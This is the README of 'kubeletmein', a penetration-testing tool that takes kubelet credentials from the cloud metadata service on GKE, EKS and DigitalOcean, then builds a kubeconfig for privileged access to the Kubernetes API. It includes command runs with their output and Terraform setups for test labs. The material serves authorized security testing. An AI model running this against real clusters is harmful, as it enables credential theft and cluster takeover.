# Kubeletmein

This is a simple penetration testing tool which takes advantage of public cloud provider approaches to providing kubelet credentials to nodes in a Kubernetes cluster in order to gain privileged access to the k8s API. This access can then potentially be used to further compromise the applications running in the cluster or, in many cases, access secrets that facilitate complete control of Kubernetes.

## How it works

`kubeletmein` is a simple Go binary that is designed to be run from a pod inside your target cluster. Typically this will be either via exploiting a weakness in a web application running on Kubernetes or, perhaps an internal penetration test where the client has given you exec access into a pod.

It reads kubelet credentials from the cloud provider metadata and configures a kubeconfig file that you can use with `kubectl` to access the API.

There's more info in our blog post at [https://www.4armed.com/blog/hacking-kubelet-on-gke/](https://www.4armed.com/blog/hacking-kubelet-on-gke/).

## Supported providers

### GKE

GKE is fully supported and relies on the metadata concealmeant being disabled (the default setting).

### EKS

EKS support added by @airman604 based on the AWS EKS [bootstrap script](https://github.com/awslabs/amazon-eks-ami/blob/master/files/bootstrap.sh). This is a one step process and doesn't create a fake node, but rather impersonates the node on which the pod is running.

### Digital Ocean

By default, DO provides creds by metadata and this cannot be disabled.

### AKS

I should probably look at Azure at some point but....Microsoft. ;-)


## Installation

It's a single binary compiled for Linux. Download it with `cURL` or `wget` from the releases page at [https://github.com/4armed/kubeletmein/releases](https://github.com/4armed/kubeletmein/releases).

## How to

A breaking change in v0.11.0 and upwards means kubeletmein uses a single stage process for all providers. Therefore just takes a single argument for the provider and, depending on the provider (i.e. not EKS) a node-name will be required to generate the certificate for.

### GKE

```
root@kubeletmein-vulnerable:/# kubeletmein gke -n foo
2021-03-04T22:25:52Z [ℹ]  fetching kubelet creds from metadata service
2021-03-04T22:25:52Z [ℹ]  writing ca cert to: ca-certificates.crt
2021-03-04T22:25:52Z [ℹ]  writing kubelet cert to: kubelet.crt
2021-03-04T22:25:52Z [ℹ]  writing kubelet key to: kubelet.key
2021-03-04T22:25:52Z [ℹ]  generating bootstrap-kubeconfig file at: bootstrap-kubeconfig
2021-03-04T22:25:52Z [ℹ]  wrote bootstrap-kubeconfig
2021-03-04T22:25:52Z [ℹ]  using bootstrap-config to request new cert for node: foo
2021-03-04T22:25:53Z [ℹ]  got new cert and wrote kubeconfig
2021-03-04T22:25:53Z [ℹ]  now try: kubectl --kubeconfig kubeconfig get pods
root@kubeletmein-vulnerable:/# kubectl --kubeconfig kubeconfig get pods
NAME                     READY   STATUS    RESTARTS   AGE
kubeletmein-vulnerable   1/1     Running   0          12m
root@kubeletmein-vulnerable:/# kubectl --kubeconfig kubeconfig get nodes
NAME                                                  STATUS   ROLES    AGE   VERSION
gke-kubeletmein-kubeletmein-vulnerabl-6623dbee-mgkd   Ready    <none>   11m   v1.18.12-gke.1210
```

Now you can use the kubeconfig, as it suggests.

```
kubectl --kubeconfig kubeconfig get pods
```

### EKS

On EKS we can impersonate current node in a single step using IAM authentication.

```
~ $ kubeletmein eks
2021-03-02T21:37:59Z [ℹ]  generating kubeconfig for current EKS node
2021-03-02T21:37:59Z [ℹ]  fetching cluster information from user-data from the metadata service
2021-03-02T21:37:59Z [ℹ]  getting IMDSv2 token
2021-03-02T21:37:59Z [ℹ]  getting user-data
2021-03-02T21:37:59Z [ℹ]  generating EKS node kubeconfig file at: kubeconfig
2021-03-02T21:37:59Z [ℹ]  wrote kubeconfig
2021-03-02T21:37:59Z [ℹ]  to use the kubeconfig, download aws-iam-authenticator to the current directory and make it executable by following the instructions at https://docs.aws.amazon.com/eks/latest/userguide/install-aws-iam-authenticator.html
2021-03-02T21:37:59Z [ℹ]  then try: kubectl --kubeconfig kubeconfig get pods
```

Now you can use the kubeconfig, as it suggests. Follow the instructions at
https://docs.aws.amazon.com/eks/latest/userguide/install-aws-iam-authenticator.html to download `aws-iam-authenticator`
(and make it executable), then run:

```
kubectl --kubeconfig kubeconfig get pods
```

### Digital Ocean

```
~ $ kubeletmein do -n whatevs
2018-12-12T23:34:19Z [ℹ]  fetching kubelet creds from metadata service
2018-12-12T23:34:19Z [ℹ]  writing ca cert to: ca-certificates.crt
2018-12-12T23:34:19Z [ℹ]  generating bootstrap-kubeconfig file at: bootstrap-kubeconfig
2018-12-12T23:34:19Z [ℹ]  wrote bootstrap-kubeconfig
2018-12-12T23:34:19Z [ℹ]  now generate a new node certificate with: kubeletmein do generate
2018-12-12T23:36:46Z [ℹ]  using bootstrap-config to request new cert for node: whatevs
2018-12-12T23:36:46Z [ℹ]  got new cert and wrote kubeconfig
2018-12-12T23:36:46Z [ℹ]  now try: kubectl --kubeconfig kubeconfig get pods
```

## Testing

### Terraform

To simplify the process, if you want to fire up some clusters to test this on, there are example Terraform configurations provided in the `deploy/terraform` directory. There is one per cloud provider supported. You will need to provide credentials for the provider. If you're not sure how to do this head over to the Terraform website and checkout the relevant provider docs.

AWS - (https://registry.terraform.io/providers/hashicorp/aws/latest/docs)[https://registry.terraform.io/providers/hashicorp/aws/latest/docs]
GCP - (https://registry.terraform.io/providers/hashicorp/google/latest/docs)[https://registry.terraform.io/providers/hashicorp/google/latest/docs]
Digital Ocean - (https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs)[https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs]

** NOTE - ONLY GKE IS CURRENTLY RELEASED, OTHERS ARE COMING VERY SOON **

Each folder has a `Makefile` you can use if you wish to init, plan and apply the configs. You can update the `terraform.tfvars` with the necessary changes or set `TF_VAR_xx` variables. However you prefer.

The plans will create a cluster and then deploy the `4armed/kubeletmein` container image in a pod. You can then exec into this pod and run the tool. Here is output from running this on GKE.

```bash
$ kubectl exec -ti kubeletmein-vulnerable bash
root@kubeletmein-vulnerable:/# kubeletmein gke -n foo
2021-03-04T22:25:52Z [ℹ]  fetching kubelet creds from metadata service
2021-03-04T22:25:52Z [ℹ]  writing ca cert to: ca-certificates.crt
2021-03-04T22:25:52Z [ℹ]  writing kubelet cert to: kubelet.crt
2021-03-04T22:25:52Z [ℹ]  writing kubelet key to: kubelet.key
2021-03-04T22:25:52Z [ℹ]  generating bootstrap-kubeconfig file at: bootstrap-kubeconfig
2021-03-04T22:25:52Z [ℹ]  wrote bootstrap-kubeconfig
2021-03-04T22:25:52Z [ℹ]  using bootstrap-config to request new cert for node: foo
2021-03-04T22:25:53Z [ℹ]  got new cert and wrote kubeconfig
2021-03-04T22:25:53Z [ℹ]  now try: kubectl --kubeconfig kubeconfig get pods
root@kubeletmein-vulnerable:/# kubectl --kubeconfig kubeconfig get pods
NAME                     READY   STATUS    RESTARTS   AGE
kubeletmein-vulnerable   1/1     Running   0          12m
root@kubeletmein-vulnerable:/# kubectl --kubeconfig kubeconfig get nodes
NAME                                                  STATUS   ROLES    AGE   VERSION
gke-kubeletmein-kubeletmein-vulnerabl-6623dbee-mgkd   Ready    <none>   11m   v1.18.12-gke.1210
```

## Contributing

Please submit pull requests on a separate branch. We welcome all improvements. It's not the world's best bit of code.

Please raise issues on GitHub if you find any, including feature requests.

## Disclaimer

This is intended for professional security testing or research. We subscribe to the DBAD philosophy.
